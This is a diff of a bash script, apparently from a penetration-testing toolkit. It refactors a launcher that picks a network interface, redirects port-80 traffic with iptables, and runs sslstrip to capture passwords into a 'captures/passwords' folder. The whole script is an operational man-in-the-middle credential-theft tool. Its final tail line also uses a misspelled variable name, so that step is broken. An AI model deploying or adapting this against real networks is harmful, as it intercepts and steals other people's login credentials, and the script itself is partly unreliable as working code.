@@ -3,88 +3,59 @@
 
 ##################################################
 f_interface(){
-        clear
+  clear
+  echo "Select which interface you would like to sniff on? (1-6):"
+  echo
+  echo "1. eth0  (USB ethernet adapter)"
+  echo "2. wlan0  (Internal Nexus Wifi)"
+  echo "3. wlan1  (USB TPlink Atheros)"
+  echo "4. mon0  (monitor mode interface)"
+  echo "5. at0  (Use with EvilAP)"
+  echo "6. rmnet_usb0 (Internal 3G GSM)"
+  echo
 
-echo 
-echo 
-echo "Select which interface you would like to sniff on? (1-6):"
-echo 
-echo "1. eth0  (USB ethernet adapter)"
-echo "2. wlan0  (Internal Nexus Wifi)"
-echo "3. wlan1  (USB TPlink Atheros)"
-echo "4. mon0  (monitor mode interface)"
-echo "5. at0  (Use with EvilAP)"
-echo "6. rmnet_usb0 (Internal 3G GSM)"
-echo
+  read -p "Choice: " interfacechoice
 
-        read -p "Choice: " interfacechoice
-
-        case $interfacechoice in
-        1) f_eth0 ;;
-        2) f_wlan0 ;;
-        3) f_wlan1 ;;
-        4) f_mon0 ;;
-        5) f_at0 ;;
-      	6) f_rmnet_usb0 ;;
-        *) f_interface ;;
-        esac
+  case $interfacechoice in
+    1) interface=eth0 ;;
+    2) interface=wlan0 ;;
+    3) interface=wlan1 ;;
+    4) interface=mon0 ;;
+    5) interface=at0 ;;
+    6) interface=rmnet_usb0 ;;
+    *) f_interface ;;
+esac
 }
 
-#########################################
-f_eth0(){
-	interface=eth0
-}
-
-#########################################
-f_wlan0(){
-        interface=wlan0
-}
-
-
-#########################################
-f_wlan1(){
-        interface=wlan1
-}
-
-
-#########################################
-f_mon0(){
-        interface=mon0
-}
-
-
-#########################################
-f_at0(){
-        interface=at0
-}
-
-#########################################
-f_rmnet_usb0(){
-        interface=rmnet_usb0
-}
-
-f_interface
 
 #Setup IPtables for ssltrip
+f_ip_tables(){
+  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
+}
 
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
+f_logfile(){
+  echo "sslstrip$(date +%F-%H%M).log"
+}
 
-#Path to sslstrip definitions:
+f_run(){
+  #Path to sslstrip definitions:
+  clear
+  echo
+  echo  "Logging to /opt/pwnix/captures/passwords/"
+  echo
+  sleep 2
 
-clear
-echo
-echo  "Logging to /opt/pwnix/captures/passwords/"
-echo
-sleep 2
+  f_interface
+  f_ip_tables
 
-#DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"
+  sslstrip_filename=$(f_logfile)
+  sslstrip -pfk -w /opt/pwnix/captures/passwords/$sslstrip_filename  -l 8888 $interface &
 
-sslstripfilename=sslstrip$(date +%F-%H%M).log
-sslstrip -pfk -w /opt/pwnix/captures/passwords/$sslstripfilename  -l 8888 $interface &
+  sleep 3
+  echo
+  echo
+  tail -f /opt/pwnix/captures/passwords/$ssl_stripfilename
+}
 
-sleep 3
-echo
-echo
-tail -f /opt/pwnix/captures/passwords/$sslstripfilename
-
+f_run
 
